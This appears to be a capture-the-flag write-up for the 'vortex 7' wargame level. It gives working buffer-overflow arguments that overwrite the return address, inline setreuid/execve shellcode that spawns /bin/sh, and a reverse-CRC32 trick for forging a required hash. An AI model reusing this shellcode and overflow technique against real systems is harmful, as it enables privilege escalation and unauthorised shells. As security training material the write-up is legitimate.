*Revision - I cleaned up the wrapper drastically, and found a different file to patch the CRC32 hash.
*Additionally, an extra pop (pop ecx) was added to the epilogue of main, with ecx-4 being used to assign the stack pointer. This has an impact on the ret.
Other than that, its the same. Buffer overflow, but patch argv[1] overflow value to crc32 to '0xe1ca95ee'. Also have to reuse SETREUID shellcode

*argv1 now:                                                      Sets ECX, ECX-4 becomes ESP
*"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ECX\xa9\xdf\xff\xff EBP\x6c\x2b\xd7\x7e"
*┌ Which should point here, which returns to shellcode here
*\xae\xdf\xff\xffLODE=1\xc0\xb0\x46""1\xdb""f\xbb\x90\x13""1\xc9""f\xb9\x90\x13\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80"


Reverse CRC32? Supposedly can return any desired CRC32 hash by appending 4 bytes
to the end of whatever message we desire.

Helpful: http://www.danielvik.com/2010/10/calculating-reverse-crc.html

crc32.py reverse 0x5008344d

- executing that and inputting one of the resulting strings resulted in no output from vortex 7! YES.

Now to use ReverseCRC from the danielvik to find bytes to append to a string

With the shellcode at 0xffffdfbf, the string "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSS""\xBF\xDF\xFF\xFF""TTUUUUVVVVWWWWXXXXYYYYZZZZ0hlAcF" successfully hashes to 0xe1ca95ee and overwrites the return address of main! Nice.


As per usual, I wrote a local wrapper to execute the bin with a clean environment, and one for the server as well.

Lo and behold, in the time its taken me since I took a break - the binary has been modified EVER so slightly - so that payload doesn't work.

Now, instead of a leave + ret, it pops some values off of the stack to re-assign esp... pretty weird.

Right before the return, it does these instructions:

┌─────────── vortex7 ───────────┐
  mov     eax, 0x0
  lea     esp, [ebp-0x8]
  pop     ecx
  pop     ebx {__saved_ebx}
  pop     ebp {__saved_ebp}
  lea     esp, [ecx-0x4]
  retn
└───────────────────────────────┘

As such, some of the arguments had to be modified


Argv[1] becomes this:
                                                                    ┌location of '\xc1\xdf\xff\xff'+4 (in env, SHE\xc1\xdf\xff\xffDE=...)
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOP""\xb9\xdf\xff\xff""EduTc0"
SHE\xc1\xdf\xff\xff""DE=\x50.....
      └actual location of shellcode, starting with the \x50

When these instructions execute, the address 0xffffdfc1 gets popped into ecx.
Then, ecx-0x4 is loaded into esp, which is the address where 0xffffdfc1 is at the top of the stack.
THEN the return instruction is called, and that location points to the actual shellcode.

A bit weird, and I'm not sure where the change came from - but it's done!
